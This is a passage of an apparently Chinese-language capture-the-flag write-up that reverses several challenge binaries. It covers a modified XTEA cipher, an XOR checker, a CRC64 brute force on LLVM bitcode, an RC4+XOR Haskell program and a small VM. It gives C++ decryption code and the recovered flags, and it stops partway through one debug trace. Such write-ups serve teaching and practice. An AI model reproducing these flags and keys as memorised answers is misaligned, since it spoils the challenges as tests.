W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> faff3738 <span class="token operator">=</span> <span class="token number">15</span>c6c96aa
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5</span>c6c96aa <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">7f</span>4fc3cc
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7f</span>4fc3cc <span class="token operator">^</span> <span class="token number">3</span>c28f71e <span class="token operator">=</span> <span class="token number">436734</span>d2
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">436734</span>d2 <span class="token operator">+</span> f580d1d8 <span class="token operator">=</span> <span class="token number">138e806</span>aa</code></pre>

<p>通过观察可以发现是一个魔改的XTea加密。</p>
<p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p>
<p>写出对应加密的c++代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">encipher</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> delta <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">72</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v1 <span class="token operator">^</span> <span class="token number">0x11223344</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xabab1212</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">+=</span> tmp2<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v0 <span class="token operator">^</span> <span class="token number">0x55667788</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x23235566</span> <span class="token operator">^</span> tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">+=</span> tmp4<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span> <span class="token operator">*</span> <span class="token number">72</span><span class="token punctuation">,</span> delta <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">72</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> tmp3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v0 <span class="token operator">^</span> <span class="token number">0x55667788</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x23235566</span> <span class="token operator">^</span> tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">-=</span> tmp4<span class="token punctuation">;</span>
        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v1 <span class="token operator">^</span> <span class="token number">0x11223344</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xabab1212</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">-=</span> tmp2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>提取chal程序中的密文，进行解密即可。</p>
<p>完整解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>

<span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span> <span class="token operator">*</span> <span class="token number">72</span><span class="token punctuation">,</span> delta <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">72</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> tmp3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v0 <span class="token operator">^</span> <span class="token number">0x55667788</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x23235566</span> <span class="token operator">^</span> tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">-=</span> tmp4<span class="token punctuation">;</span>
        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v1 <span class="token operator">^</span> <span class="token number">0x11223344</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xabab1212</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">-=</span> tmp2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token number">0x776f6853</span><span class="token punctuation">,</span>
        <span class="token number">0x656b616d</span><span class="token punctuation">,</span>
        <span class="token number">0x616d5f72</span><span class="token punctuation">,</span>
        <span class="token number">0x74696564</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> Encflag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x696C2E9A</span><span class="token punctuation">,</span> <span class="token number">0x76ADE8E1</span><span class="token punctuation">,</span> <span class="token number">0xE67D5CA4</span><span class="token punctuation">,</span> <span class="token number">0x5C76BD38</span><span class="token punctuation">,</span>
        <span class="token number">0xB7AC0787</span><span class="token punctuation">,</span> <span class="token number">0xBFEA0C65</span><span class="token punctuation">,</span> <span class="token number">0x01C2FF10</span><span class="token punctuation">,</span> <span class="token number">0x6D16FD38</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span>Encflag<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>Encflag <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>Encflag <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>Encflag <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.32s\n"</span><span class="token punctuation">,</span> Encflag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p>
<h3 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h3><p>跟到moon.xor_crypt实际加密处。</p>
<p><img src="/images/6-1744626745337-11.png" loading="lazy"></p>
<p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p>
<p>断在xor这个命令，运行附加调试，随便输入一串1</p>
<p><img src="/images/7-1744626745337-12.png" loading="lazy"></p>
<p><img src="/images/8-1744626745338-15.png" loading="lazy"></p>
<p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p>
<p>直接断在return处，v20是最后将list转成Bytes的结果。</p>
<p><img src="/images/9-1744626745338-13.png" loading="lazy"></p>
<p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p>
<p><img src="/images/10-1744626745338-14.png" loading="lazy"></p>
<p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p>
<p><img src="/images/11-1744626745338-16.png" loading="lazy"></p>
<p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p>
<p><img src="/images/12-1744626745338-18.png" loading="lazy"></p>
<p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p>
<p><img src="/images/13-1744626745338-17.png" loading="lazy"></p>
<p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p>
<p><img src="/images/14-1744626745338-19.png" loading="lazy"></p>
<p><img src="/images/15-1744626745338-20.png" loading="lazy"></p>
<p><img src="/images/16-1744626745338-21.png" loading="lazy"></p>
<p>最后在RichCompare处就可以得到xor密文的列表。</p>
<p><img src="/images/17-1744626745338-22.png" loading="lazy"></p>
<p>将v9的密文与这个数据进行xor即可得到flag。</p>
<p><img src="/images/18-1744626745338-23.png" loading="lazy"></p>
<p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p>
<h3 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h3><p>.bc 后缀 </p>
<p>反编译为LLVM IR</p>
<pre class="language-python" data-language="python"><code class="language-python">llvm<span class="token operator">-</span>dis<span class="token operator">-</span><span class="token number">17</span> Dragon<span class="token punctuation">.</span>bc <span class="token operator">-</span>o Dragon<span class="token punctuation">.</span>ll</code></pre>

<p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;

uint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) &#123;
    uint64_t crc &#x3D; 0xFFFFFFFFFFFFFFFFULL; 

    for (uint64_t i &#x3D; 0; i &lt; length; i++) &#123;
        crc ^&#x3D; ((uint64_t)data[i] &lt;&lt; 56);

        for (uint64_t j &#x3D; 0; j &lt; 8; j++) &#123;
            if (crc &amp; 0x8000000000000000ULL) &#123; 
                crc &#x3D; (crc &lt;&lt; 1) ^ 0x42F0E1EBA9EA3693ULL; 
            &#125;
            else &#123;
                crc &#x3D; crc &lt;&lt; 1;
            &#125;
        &#125;
    &#125;

    return ~crc;
&#125;

int main() &#123;
    uint64_t enc[12] &#x3D; &#123;
       -2565957437423125689, 
        224890624719110086, 
        1357324823849588894, 
        - 8941695979231947288, 
        - 253413330424273460, 
        - 7817463785137710741, 
        - 5620500441869335673, 
        984060876288820705, 
        - 6993555743080142153, 
        - 7892488171899690683, 
        7190415315123037707, 
        - 7218240302740981077
    &#125;;
    char flag[25] &#x3D; &#123; 0 &#125;;
    int flag_index &#x3D; 0;


    for (int k &#x3D; 0; k &lt; 12; k++) &#123;
        uint64_t target_crc &#x3D; enc[k];
        int found &#x3D; 0;
        for (unsigned char c1 &#x3D; 32; c1 &lt; 127 &amp;&amp; !found; c1++) &#123;
            for (unsigned char c2 &#x3D; 32; c2 &lt; 127 &amp;&amp; !found; c2++) &#123;
                unsigned char test[2] &#x3D; &#123; c1, c2 &#125;;
                uint64_t crc &#x3D; calculate_crc64_direct(test, 2);
                if (crc &#x3D;&#x3D; target_crc) &#123;
                    flag[flag_index++] &#x3D; c1;
                    flag[flag_index++] &#x3D; c2;
                    break;
                &#125;
            &#125;
        &#125;
    &#125;

    flag[flag_index] &#x3D; &#39;\0&#39;;
    printf(&quot;Decrypted flag: %s\n&quot;, flag);

    return 0;
&#125;
&#x2F;&#x2F;flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</code></pre>

<h3 id="Summer"><a href="#Summer" class="headerlink" title="Summer"></a>Summer</h3><p>haskell程序</p>
<p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p>
<p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p>
<p><img src="/images/31-1744626745338-24.png" loading="lazy"></p>
<p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p>
<p><img src="/images/19-1744626745338-25.png" loading="lazy"></p>
<p>GHCziInternalziBase也是底层函数，主要关注两个参数</p>
<p><img src="/images/20-1744626745338-26.png" loading="lazy"></p>
<p>第一个参数的地址处的函数为打印字符串</p>
<p><img src="/images/21-1744626745338-27.png" loading="lazy"></p>
<p><img src="/images/22-1744626745338-28.png" loading="lazy"></p>
<p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc<strong>，</strong>zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p>
<p><img src="/images/23-1744626745338-29.png" loading="lazy"></p>
<p><img src="/images/24-1744626745338-30.png" loading="lazy"></p>
<p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p>
<p><img src="/images/25-1744626745338-31.png" loading="lazy"></p>
<p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p>
<p><img src="/images/26-1744626745338-32.png" loading="lazy"></p>
<p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p>
<p><img src="/images/27-1744626745338-33.png" loading="lazy"></p>
<p><img src="/images/28-1744626745338-34.png" loading="lazy"></p>
<p><img src="/images/29-1744626745338-35.png" loading="lazy"></p>
<p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p>
<p><img src="/images/30-1744626745338-36.png" loading="lazy"></p>
<p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p>
<p><img src="/images/32-1744626745338-37.png" loading="lazy"></p>
<p><img src="/images/33-1744626745338-38.png" loading="lazy"></p>
<p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p>
<p><img src="/images/34-1744626745338-39.png" loading="lazy"></p>
<p><img src="/images/35-1744626745338-40.png" loading="lazy"></p>
<p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p>
<h3 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h3><p>单步跟到主函数。</p>
<p><img src="/images/36-1744626745338-41.png" loading="lazy"></p>
<p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p>
<p><img src="/images/37-1744626745338-42.png" loading="lazy"></p>
<p>然后接着第二次加密，最后循环比较。</p>
<p><img src="/images/38-1744626745338-44.png" loading="lazy"></p>
<p><img src="/images/39-1744626745338-43.png" loading="lazy"></p>
<p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p>
<p><img src="/images/40-1744626745338-45.png" loading="lazy"></p>
<p><img src="/images/41-1744626745338-46.png" loading="lazy"></p>
<p><img src="/images/42-1744626745338-48.png" loading="lazy"></p>
<p>调试输出：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">Input<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">85</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">6</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">13</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">15</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">126</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">3</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">11</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
